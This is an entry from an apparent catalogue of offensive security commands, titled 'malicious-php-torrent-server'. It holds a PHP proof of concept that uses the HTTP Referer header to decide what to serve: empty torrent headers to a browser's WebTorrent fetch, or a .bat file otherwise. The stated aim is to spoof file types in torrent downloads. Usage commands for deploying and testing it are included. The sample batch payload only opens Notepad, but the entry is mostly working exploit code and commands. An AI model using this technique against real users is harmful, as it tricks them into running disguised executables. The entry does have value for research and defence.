---
id: cmd-uuid-1
data: >-
  <?php

  if(isset($_SERVER['HTTP_REFERER'])){

  header("Content-Disposition: attachment; filename='PoC.torrent';
  filename*=UTF-8''PoC.torrent");

  header("Content-Type: application/octet-stream");

  }

  else{

  header("Content-Disposition: attachment; filename='PoC.bat';
  filename*=UTF-8''PoC.bat");

  header("Content-Type: application/x-bat");

  echo"@echo off\n";

  echo"START C:\\Windows\\NOTEPAD.EXE";

  }

  ?>
tags:
  - spoofing
  - headers
type: command
output: >-
  If Referer present: Empty response with torrent headers. If absent: .bat file
  content that opens Notepad when executed
executor: php
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:28.229Z'
verified: false
validated: true
submitted: true
---
# malicious-php-torrent-server

## Command

```php
<?php
if(isset($_SERVER['HTTP_REFERER'])){
header("Content-Disposition: attachment; filename='PoC.torrent'; filename*=UTF-8''PoC.torrent");
header("Content-Type: application/octet-stream");
}
else{
header("Content-Disposition: attachment; filename='PoC.bat'; filename*=UTF-8''PoC.bat");
header("Content-Type: application/x-bat");
echo"@echo off\n";
echo"START C:\\Windows\\NOTEPAD.EXE";
}
?>
```

## Description

PHP script for a malicious server that serves different content based on HTTP Referer presence: fake .torrent headers if Referer is set (Brave WebTorrent request), or a .bat payload otherwise. Used to spoof file types in torrent downloads.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| HTTP_REFERER | Checks if set to determine response; present = torrent headers, absent = .bat payload | No (checked internally) |

## Examples

### Basic Usage

Save as test-driver.php and access via browser or curl.

```bash
php -S localhost:8000  # Run locally, then access /test-driver.php
```

### Advanced Usage

Deploy on remote PHP server; test with/without Referer header.

```bash
curl -H "Referer: https://brave.com" http://server/test-driver.php
curl http://server/test-driver.php
```

## Expected Output

If Referer present: HTTP headers for .torrent (empty body). If absent: Headers for .bat with payload echoing @echo off and START C:\\Windows\\NOTEPAD.EXE.

## Related

- [[commands/rce-batch-payload]]
